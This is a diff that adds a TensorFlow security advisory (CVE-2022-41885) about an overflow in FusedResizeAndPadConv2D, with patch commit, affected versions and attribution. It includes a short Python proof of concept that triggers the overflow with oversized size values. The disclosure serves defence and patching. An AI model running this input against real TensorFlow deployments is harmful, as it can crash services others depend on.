@@ -1,0 +1,24 @@
+<h2>TFSA-2022-147: Overflow in <code>FusedResizeAndPadConv2D</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-41885</p>
+<h3>Impact</h3>
+<p>When <a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/conv_ops_fused_image_transform.cc"><code>tf.raw_ops.FusedResizeAndPadConv2D</code></a> is given a large tensor shape, it overflows.
+```python
+import tensorflow as tf</p>
+<p>mode = "REFLECT"
+strides = [1, 1, 1, 1]
+padding = "SAME"
+resize_align_corners = False
+input = tf.constant(147, shape=[3,3,1,1], dtype=tf.float16)
+size = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
+paddings = tf.constant([3,4], shape=[2], dtype=tf.int32)
+filter = tf.constant(123, shape=[1,3,4,1], dtype=tf.float16)
+tf.raw_ops.FusedResizeAndPadConv2D(input=input, size=size, paddings=paddings, filter=filter, mode=mode, strides=strides, padding=padding, resize_align_corners=resize_align_corners)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/d66e1d568275e6a2947de97dca7a102a211e01ce">d66e1d568275e6a2947de97dca7a102a211e01ce</a>.</p>
+<p>The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.</p>
